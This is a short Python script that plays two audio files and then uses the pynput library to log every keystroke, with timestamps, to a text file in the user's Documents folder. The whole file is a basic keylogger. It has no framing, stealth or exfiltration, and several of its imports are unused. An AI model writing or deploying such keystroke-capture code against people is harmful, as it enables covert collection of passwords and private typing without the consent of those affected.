

from pynput.keyboard import Listener
import time
import os
import logging
from shutil import copyfile
import sys
from playsound import playsound
import keyboard
import time

playsound(os.path.expanduser("~/Downloads/bot_voice1.mp3"))
playsound(os.path.expanduser("~/Downloads/bot_voice2.mp3"))
log_dir = os.path.expanduser("~/Documents")

logging.basicConfig(filename=f"{log_dir}/key_log.txt", level= logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()







